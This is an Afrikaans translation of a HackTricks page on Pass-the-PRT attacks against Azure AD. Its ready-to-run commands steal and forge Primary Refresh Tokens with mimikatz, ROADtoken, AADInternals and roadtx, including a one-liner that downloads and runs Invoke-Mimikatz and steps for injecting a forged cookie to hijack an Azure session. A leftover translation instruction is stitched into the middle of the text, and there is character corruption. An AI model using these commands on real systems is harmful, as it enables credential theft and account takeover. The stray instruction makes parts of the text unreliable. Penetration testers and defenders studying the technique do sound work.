# Az - Gee die PRT oor

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Wat is 'n PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Kontroleer of jy 'n PRT het
```
Dsregcmd.exe /status
```
In die SSO-staat-seksie moet jy sien dat die **`AzureAdPrt`** ingestel is op **JA**.

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

In dieselfde uitset kan jy ook sien of die **toestel aan Azure gekoppel is** (in die veld `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## PRT-koekie

Die PRT-koekie word eintlik **`x-ms-RefreshTokenCredential`** genoem en dit is 'n JSON Web Token (JWT). 'n JWT bevat **3 dele**, die **kop**, **inhoud** en **handtekening**, verdeel deur 'n `.` en almal url-veilige basis64-gekodeer. 'n Tipiese PRT-koekie bevat die volgende kop en liggaam:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Die werklike **Prim√™re Verfris Token (PRT)** is ingesluit binne die **`refresh_token`**, wat deur 'n sleutel onder beheer van Azure AD versleutel is, wat die inhoud onduidelik en onontcijferbaar vir ons maak. Die veld **`is_primary`** dui op die inkapseling van die prim√™re verfris token binne hierdie token. Om te verseker dat die koekie gebind bly aan die spesifieke aanmeldsessie waarvoor dit bedoel was, word die `request_nonce` vanaf die `logon.microsoftonline.com`-bladsy oorgedra.

### PRT Koekie vloei met TPM

Die **LSASS**-proses sal die **KDF-konteks** na die TPM stuur, en die TPM sal die **sessiesleutel** (versamel toe die toestel in AzureAD geregistreer is en in die TPM gestoor word) en die vorige konteks gebruik om 'n **sleutel** af te lei, en hierdie **afgeleide sleutel** word gebruik om die PRT-koekie (JWT) te **teken**.

Die **KDF-konteks** is 'n nonce van AzureAD en die PRT wat 'n **JWT** saam met 'n **konteks** (willekeurige bytes) skep.

Daarom, selfs al kan die PTR nie ge√´kstraheer word omdat dit binne die TPM gele√´ is nie, is dit moontlik om LSASS te misbruik om **afgeleide sleutels van nuwe kontekste aan te vra en die gegenereerde sleutels te gebruik om Koekies te teken**.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## PRT Misbruik Scenario's

As 'n **gewone gebruiker** is dit moontlik om **PRT-gebruik aan te vra** deur LSASS vir SSO-data te vra.\
Dit kan gedoen word soos **inheemse programme** wat tokens van die **Web Account Manager** (token makelaar) aanvra. WAM stuur die versoek na **LSASS**, wat vir tokens vra deur 'n ondertekende PRT-aanspraak te gebruik. Of dit kan gedoen word met **blaaier-gebaseerde (web) vloeie** waar 'n **PRT-koekie** as **kop** gebruik word om versoeke na Azure AS-aanmeldbladsye te outentiseer.

As **SYSTEM** kan jy die PRT **steel as dit nie deur die TPM beskerm word nie** of **met PRT-sleutels in LSASS interaksie h√™** deur kriptografiese API's te gebruik.

## Voorbeelde van Pass-the-PRT Aanvalle

### Aanval - ROADtoken

Vir meer inligting oor hierdie metode [**kyk na hierdie pos**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken sal **`BrowserCore.exe`** van die regte gids uitvoer en dit gebruik om 'n PRT-koekie te **verkry**. Hierdie koekie kan dan met ROADtools gebruik word om te outentiseer en 'n volhoubare verfris token te **verkry**.

Om 'n geldige PRT-koekie te genereer, is die eerste ding wat jy nodig het 'n nonce.\
Jy kan dit kry met:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Of deur [**roadrecon**](https://github.com/dirkjanm/ROADtools) te gebruik:
```powershell
roadrecon auth prt-init
```
Dan kan jy [**roadtoken**](https://github.com/dirkjanm/ROADtoken) gebruik om 'n nuwe PRT te kry (hardloop die instrument van 'n proses van die gebruiker om aan te val):
```powershell
.\ROADtoken.exe <nonce>
```
Die volgende is inhoud uit 'n hakboek oor haktegnieke. Die volgende inhoud is uit die l√™er /hive/hacktricks-cloud/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met presies dieselfde markdown- en html-sintaks. Moenie dinge soos kode, haktegniekname, hakwoorde, wolk-/SaaS-platformname (soos Workspace, aws, gcp...), die woord 'leak', pentesting en markdown-etikette vertaal nie. Voeg ook geen ekstra goed by behalwe die vertaling en markdown-sintaks nie.
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Dan kan jy die **gegenereerde koekie** gebruik om **tokens te genereer** om in te teken met behulp van Azure AD **Graph** of Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Aanval - Gebruik van roadrecon



### Aanval - Gebruik van AADInternals en 'n uitgelek PRT

`Get-AADIntUserPRTToken` **kry die gebruiker se PRT-token** van die Azure AD-gekoppelde of hibried-gekoppelde rekenaar. Gebruik `BrowserCore.exe` om die PRT-token te kry.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Of as jy die waardes van Mimikatz het, kan jy ook AADInternals gebruik om 'n token te genereer:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Gaan na [https://login.microsoftonline.com](https://login.microsoftonline.com), skoon alle koekies vir login.microsoftonline.com en voer 'n nuwe koekie in.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Gaan dan na [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Die res moet die verstekwaardes wees. Maak seker dat jy die bladsy kan verfris en dat die koekie nie verdwyn nie. As dit wel gebeur, het jy dalk 'n fout gemaak en moet jy die proses weer deurloop. As dit nie gebeur nie, behoort jy reg te wees.
{% endhint %}

### Aanval - Mimikatz

#### Stappe

1. Die **PRT (Prim√™re Verfris Token) word uit LSASS (Local Security Authority Subsystem Service) ge√´kstraheer** en gestoor vir latere gebruik.
2. Die **Sessiesleutel word daarna ge√´kstraheer**. Aangesien hierdie sleutel aanvanklik uitgereik en daarna deur die plaaslike toestel herversleutel word, vereis dit ontsleuteling met behulp van 'n DPAPI-meestersleutel. Gedetailleerde inligting oor DPAPI (Data Protection API) kan gevind word in hierdie bronne: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) en vir 'n begrip van die toepassing daarvan, verwys na die [Pass-the-cookie aanval](az-pass-the-cookie.md).
3. Na ontsleuteling van die Sessiesleutel, word die **afgeleide sleutel en konteks vir die PRT verkry**. Hierdie is noodsaaklik vir die **skepping van die PRT-koekie**. Spesifiek word die afgeleide sleutel gebruik om die JWT (JSON Web Token) te onderteken wat die koekie vorm. 'n Omvattende verduideliking van hierdie proses is deur Dirk-jan verskaf en is toeganklik [hier](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Let daarop dat as die PRT binne die TPM is en nie binne `lsass` nie, **sal mimikatz nie in staat wees om dit te onttrek nie**.\
Dit sal egter moontlik wees om 'n sleutel van 'n afgeleide sleutel van 'n konteks uit die TPM te kry en dit te gebruik om 'n koekie te onderteken (kontroleer opsie 3).
{% endhint %}

Jy kan 'n **in-diepte verduideliking van die uitgevoerde proses** om hierdie besonderhede te onttrek, hier vind: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Dit sal nie presies werk nie na die herstelwerk wat in Augustus 2021 gedoen is om ander gebruikers se PRT-token te kry nie, aangesien slegs die gebruiker sy PRT kan kry ( 'n plaaslike administrateur kan nie ander gebruikers se PRT's kry nie), maar kan syne kry.
{% endhint %}

Jy kan **mimikatz** gebruik om die PRT te onttrek:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images van https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

**Kopieer** die gedeelte wat as **Prt** gemerk is en stoor dit.\
Haal ook die sessiesleutel uit (die **`KeyValue`** van die **`ProofOfPossesionKey`** veld) wat jy hieronder gemerk kan sien. Dit is versleutel en ons sal ons DPAPI-meestersleutels moet gebruik om dit te ontsluit.

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
As jy nie enige PRT-data sien nie, kan dit wees dat jy **nie enige PRTs het** nie omdat jou toestel nie by Azure AD aangesluit is nie, of dit kan wees dat jy 'n **ou weergawe** van Windows 10 gebruik.
{% endhint %}

Om die sessiesleutel te **ontsluit**, moet jy jou bevoegdhede verhoog na **SYSTEM** om onder die rekenaar konteks te loop sodat jy die **DPAPI-meestersleutel kan gebruik om dit te ontsluit**. Jy kan die volgende opdragte gebruik om dit te doen:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

#### Opsie 1 - Volledige Mimikatz

* Nou wil jy beide die Konteks waarde kopieer:

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* En die afgeleide sleutel waarde:

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* Uiteindelik kan jy al hierdie inligting gebruik om **PRT-koekies te genereer**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* Gaan na [https://login.microsoftonline.com](https://login.microsoftonline.com), skoon alle koekies vir login.microsoftonline.com en voer 'n nuwe koekie in.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Ga na [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Die res moet die verstekwaardes wees. Maak seker dat jy die bladsy kan verfris en dat die koekie nie verdwyn nie. As dit wel gebeur, het jy dalk 'n fout gemaak en moet jy die proses weer deurloop. As dit nie gebeur nie, behoort jy reg te wees.
{% endhint %}

#### Opsie 2 - roadrecon deur gebruik te maak van PTR

* Vernuwe die PRT eerste, wat dit sal stoor in `roadtx.prt`:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Nou kan ons **tokens aanvra** deur die interaktiewe webblaaier te gebruik met `roadtx browserprtauth`. As ons die `roadtx describe` opdrag gebruik, sien ons dat die toegangstoken 'n MFA-eis bevat omdat die PRT wat ek in hierdie geval gebruik het, ook 'n MFA-eis gehad het.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Opsie 3 - roadrecon met behulp van afgeleide sleutels

Met die konteks en die afgeleide sleutel wat deur mimikatz gedump is, is dit moontlik om roadrecon te gebruik om 'n nuwe ondertekende koekie te genereer met:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Verwysings

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
